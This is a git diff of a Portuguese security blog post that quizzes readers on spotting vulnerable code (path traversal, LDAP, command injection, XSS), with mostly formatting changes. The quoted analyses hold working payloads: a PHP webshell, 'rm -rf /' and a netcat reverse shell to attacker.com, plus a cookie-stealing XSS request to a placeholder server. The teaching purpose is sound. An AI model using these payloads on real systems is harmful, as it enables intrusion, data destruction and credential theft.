@@ -9,7 +9,7 @@ comments: true
 
 ---
 
-# Prevenção sendo a arte de encontrar potencial perigo no código
+## Prevenção sendo a arte de encontrar potencial perigo no código
 
 Se você trabalha ou quer trabalhar com segurança da informação, uma hora ou outra vai precisar olhar código e identificar problemas. Pode ser num pentest, numa auditoria, num bug bounty ou até desenvolvendo sua própria aplicação. A questão é: você sabe reconhecer código vulnerável quando vê um?
 
@@ -62,7 +62,7 @@ b) Reflected XSS
 c) Path Traversal  
 d) Todas as anteriores
 
-<details>
+<details markdown="1">
 <summary><b>Ver minha análise</b></summary>
 
 Esse código pega um parâmetro `page` da URL e usa pra montar um redirect. Parece inofensivo, né? Só que tem problemas sérios aqui.
@@ -112,7 +112,7 @@ b) CGI Reflected XSS
 c) Connection String Injection  
 d) Reflected XSS
 
-<details>
+<details markdown="1">
 <summary><b>Ver minha análise</b></summary>
 
 Aqui temos **LDAP Injection** (CWE-90). O parâmetro `host` vai direto pro `ldap_search()` como Distinguished Name (DN) sem nenhum tratamento. LDAP tem sua própria sintaxe de queries, similar a SQL, e um atacante pode manipular a busca injetando caracteres especiais.
@@ -155,12 +155,12 @@ b) Stored XSS
 c) Privacy Violation  
 d) Todas as anteriores
 
-<details>
+<details markdown="1">
 <summary><b>Ver minha análise</b></summary>
 
 Esse é **Path Traversal** (CWE-22) clássico combinado com **Arbitrary File Write** (CWE-73). O atacante controla tanto o nome do arquivo quanto o conteúdo - isso é extremamente perigoso.
 
-Com `file=../../../var/www/html/shell.php` e `content=<?php system($_GET['cmd']); ?>`, o atacante acabou de criar uma webshell no servidor. Game over.
+Com `file=../../../var/www/html/shell.php` e {% raw %}`content=<?php system($_GET['cmd']); ?>`{% endraw %}, o atacante acabou de criar uma webshell no servidor. Game over.
 
 **Explorando na prática:**
 
@@ -196,7 +196,7 @@ b) Environment Injection
 c) Integer Overflow  
 d) Dangerous Functions
 
-<details>
+<details markdown="1">
 <summary><b>Ver minha análise</b></summary>
 
 À primeira vista parece inofensivo - lê um número e dorme por aquele tempo. Mas tem mais de um problema aqui.
@@ -250,7 +250,7 @@ b) Path Traversal
 c) Code Injection  
 d) Este código parece seguro
 
-<details>
+<details markdown="1">
 <summary><b>Ver minha análise</b></summary>
 
 **Path Traversal** (CWE-22) clássico. O parâmetro `currentFile` vai direto pro `open()` sem validação. Um atacante pode passar `currentFile=../../../etc/qualquer_coisa` e acessar arquivos fora do diretório esperado.
@@ -286,14 +286,14 @@ b) CGI Reflected XSS
 c) Connection String Injection  
 d) Reflected XSS
 
-<details>
+<details markdown="1">
 <summary><b>Ver minha análise</b></summary>
 
 Esse código é um CGI que imprime a variável de ambiente PATH direto na resposta HTTP. O header `Content-type: text/html` faz o navegador interpretar a saída como HTML.
 
 O problema mais óbvio aqui é **Information Disclosure** (CWE-200) - vazar o PATH do servidor revela informações sobre a estrutura do sistema, quais diretórios existem, onde estão os binários, às vezes até versões de software. Isso ajuda atacantes na fase de reconhecimento.
 
-Mas olhando as opções da questão, o foco parece ser em **CGI Reflected XSS**. A lógica seria: se um atacante conseguir de alguma forma manipular a variável de ambiente PATH antes da execução do CGI (cenário raro mas possível em hospedagem compartilhada, containers mal configurados, ou via outras vulnerabilidades), ele poderia injetar `<script>alert(1)</script>` no PATH que seria renderizado como HTML. É um vetor bem específico e incomum, mas tecnicamente possível.
+Mas olhando as opções da questão, o foco parece ser em **CGI Reflected XSS**. A lógica seria: se um atacante conseguir de alguma forma manipular a variável de ambiente PATH antes da execução do CGI (cenário raro mas possível em hospedagem compartilhada, containers mal configurados, ou via outras vulnerabilidades), ele poderia injetar `<script>alert(1)<\/script>` no PATH que seria renderizado como HTML. É um vetor bem específico e incomum, mas tecnicamente possível.
 
 A diferença entre "CGI Reflected XSS" e "Reflected XSS" normal é sutil. No XSS refletido tradicional, o input vem direto do usuário via parâmetros HTTP. No caso de CGI com variáveis de ambiente, o vetor é diferente - depende de como o ambiente do CGI é configurado. Por isso a classificação como "CGI Reflected XSS" faz sentido pra diferenciar.
 
@@ -319,7 +319,7 @@ b) SQL Injection
 c) Connection String Injection  
 d) Reflected XSS
 
-<details>
+<details markdown="1">
 <summary><b>Ver minha análise</b></summary>
 
 Aqui temos **Connection String Injection** (CWE-99 - Resource Injection). O primeiro argumento da linha de comando (`argv[0]`, que normalmente é o nome do programa mas pode ser manipulado) está sendo usado como Data Source Name (DSN) na conexão SQL via ODBC.
@@ -372,7 +372,7 @@ b) Resource Injection
 c) SQL Injection  
 d) Connection String Injection
 
-<details>
+<details markdown="1">
 <summary><b>Ver minha análise</b></summary>
 
 **Resource Injection** (CWE-99) combinado com **Path Traversal** (CWE-22). O PATH_INFO (parte da URL após o script) vai direto pra função de download de arquivo sem nenhuma validação.
@@ -434,7 +434,7 @@ b) Command Injection
 c) A e B estão corretos  
 d) Nenhuma das anteriores
 
-<details>
+<details markdown="1">
 <summary><b>Ver minha análise</b></summary>
 
 Esse código tem dois problemas sérios. O primeiro e mais crítico é **Command Injection** (CWE-78). O `zipCode` e `address` vão direto pra um `os.system()`. Se eu passar `zip="; rm -rf / #`, o servidor vai executar `zipvalidator ""; rm -rf / #" ""`. Basicamente execução remota de código (RCE).
@@ -450,14 +450,16 @@ O comando executado será: `zipvalidator "";id;#" "Rua"`. O `id` vai rodar e mos
 
 Outros payloads que funcionam: `"; whoami #` pra identificar o usuário, `"; sleep 10 #` pra confirmar RCE via delay quando não tem output (blind command injection), e se quiser uma shell reversa, `"; nc -e /bin/sh attacker.com 4444 #` resolve (assumindo que netcat está disponível no servidor).
 
-O segundo problema é **Reflected XSS** (CWE-79). Olha o `autoescape=False` no final. Isso desabilita o escape automático do Django, então qualquer coisa em `fullName`, `address` ou `zipCode` que contenha HTML/JavaScript vai ser renderizado sem tratamento. Se eu passar `fullName=<script>alert(document.cookie)</script>`, vai executar.
+O segundo problema é **Reflected XSS** (CWE-79). Olha o `autoescape=False` no final. Isso desabilita o escape automático do Django, então qualquer coisa em `fullName`, `address` ou `zipCode` que contenha HTML/JavaScript vai ser renderizado sem tratamento. Se eu passar `fullName=<script>alert(document.cookie)<\/script>`, vai executar.
 
 **Testando o XSS:**
 
+{% raw %}
 ```http
 GET /validate?fullName=<script>fetch('http://seu-servidor.com/roubo?c='+document.cookie)</script>&address=x&zip=12345 HTTP/1.1
 Host: alvo.com
 ```
+{% endraw %}
 
 A resposta correta é que **ambas as vulnerabilidades (Command Injection e XSS)** estão presentes. O Command Injection é mais severo (permite RCE), mas o XSS também é explorável.
 
@@ -599,7 +601,7 @@ Ao fazer code review de segurança, alguns erros são recorrentes. Aqui vão alg
 
 **Focar só no óbvio**: É fácil achar o `eval()` explícito, mas e quando o dado passa por 5 funções antes de chegar lá? Taint analysis (rastrear o fluxo do dado) é essencial.
 
-**Ignorar o contexto**: Uma mesma função pode ser segura ou perigosa dependendo de onde está. `htmlspecialchars()` não ajuda nada se o output vai pra um atributo JavaScript ou pra dentro de uma tag `<script>`.
+**Ignorar o contexto**: Uma mesma função pode ser segura ou perigosa dependendo de onde está. `htmlspecialchars()` não ajuda nada se o output vai pra um atributo JavaScript ou pra dentro de uma tag `<script>` (script).
 
 **Confiar em sanitização incompleta**: Blacklists quase sempre podem ser bypassadas. O Caso 9 do validador com `replace()` é um exemplo perfeito - remover "exec" não impede `ex\x65c` ou truques de encoding.
 
